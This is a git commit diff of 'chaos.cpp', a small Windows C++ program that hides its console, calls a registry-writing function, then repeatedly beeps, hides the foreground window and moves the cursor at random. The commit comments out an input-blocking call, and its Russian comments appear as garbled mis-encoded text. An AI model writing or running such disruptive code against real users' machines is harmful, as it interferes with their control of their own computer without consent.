beacb91711d5c7e4b7194cd10c4744cbd966ea4a
arcsin42 <37872554+arcsin42@users.noreply.github.com>
2018-03-28 20:01:50 +0300

    Update chaos.cpp

--- chaos.cpp
+++ chaos.cpp
@@ -1,6 +1,9 @@
 #include <iostream>
 #include <windows.h>
 #include <stdlib.h>
+#include <Winuser.h>
+#include <stdio.h>
+
 
 using namespace std;
 
@@ -14,17 +17,17 @@ int main(){
 	printf("It's show time!\n'");
 	Sleep(100);
 	
-	FreeConsole(); // убирает консоль
-	Regedit() //çàïèñü
+	FreeConsole(); // óáèðàåòñÿ êîíñîëü
+	Regedit(); //çàïèñü
 	
 	int i = 0;
 	while(i < 10){
-		BlockInput(true); //блок ввода
+		//BlockInput(true); //áëîê ââîäà
 		Beep(2000 + rand()%20000, 1000 + rand()%2000);
 		HWND window = GetForegroundWindow();
 		ShowWindow(window, SW_HIDE);
 		
-		SetCursorPos(rand()%1920, rand()%720); // сдвиг курсора
+		SetCursorPos(rand()%1920, rand()%720); // ïåðåíîñ êóðñîðà
 		i++;
 	}
 	
